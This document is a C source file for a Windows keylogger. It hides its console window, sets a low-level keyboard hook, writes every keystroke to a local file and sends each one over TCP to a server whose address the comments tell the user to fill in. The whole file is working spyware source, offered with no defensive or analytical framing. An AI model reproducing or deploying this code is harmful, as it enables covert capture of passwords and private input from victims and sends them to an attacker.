#define _WIN32_WINNT 0x0600  // for Windows Vista and later
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#define SERVER_IP "127.0.0.1" // Replace with your server IP
#define SERVER_PORT 4444

HHOOK hook;

// Function prototypes
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
int send_key(unsigned char key);
FILE *logFile; // File pointer for logging
SOCKET sock;   // Socket for sending data
void cleanup() 
{
    UnhookWindowsHookEx(hook);
    closesocket(sock);
    WSACleanup();
    fclose(logFile);
}

int main()
{
    // Hide the console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    logFile = fopen("keylog.txt", "a"); // Open log file in append mode
    if (!logFile)
    {
        printf("Failed to open log file\n");
        return 1;
    }

    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) 
    {
        printf("Failed to initialize Winsock\n");
        return 1;
    }

     // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) 
    {
        printf("Failed to create socket\n");
        WSACleanup();
        return 1;
    }

    // Setup the sockaddr structure
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_IP); // Convert IP string to address

    // Connect to the server
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        perror("Failed to connect to server");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Set up keyboard hook
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hook) 
    {
        printf("Failed to set hook\n");
        return 1;
    }

    printf("Start logging... Press Ctrl+C to stop.\n"); // Notification 
   
    // Message loop to keep the hook active
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) 
    {
        if (msg.message == WM_QUIT) 
        {
            break; // Exit the loop if quit message is received
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    UnhookWindowsHookEx(hook);
    closesocket(sock); // Close the socket
    WSACleanup(); // Clean up Winsock
    fclose(logFile); // Close the log file
    cleanup();
    return 0;
}

// Function to send the logged key to the remote server
int send_key(unsigned char key) 
{
    if (send(sock, (char*)&key, sizeof(key), 0) == SOCKET_ERROR) {
        // Connection lost or error occurred
        return 0;
    }
    return 1; // Successfully sent
}

// Keyboard procedure to handle key events
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) 
{
    if (code == HC_ACTION) 
    {
        // Check if a key is pressed
        if (wParam == WM_KEYDOWN) 
        {
            DWORD vkCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode; // Get virtual key code
            printf("%c", (char)vkCode);
            if (!send_key((char)vkCode)) {
                // Connection lost, post quit message
                PostQuitMessage(0);
                return 1; // Stop further processing
            }
            fprintf(logFile, "%c ", (char)vkCode); // Log the key code
            fflush(logFile); // Flush the output buffer
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam); // Call the next hook
}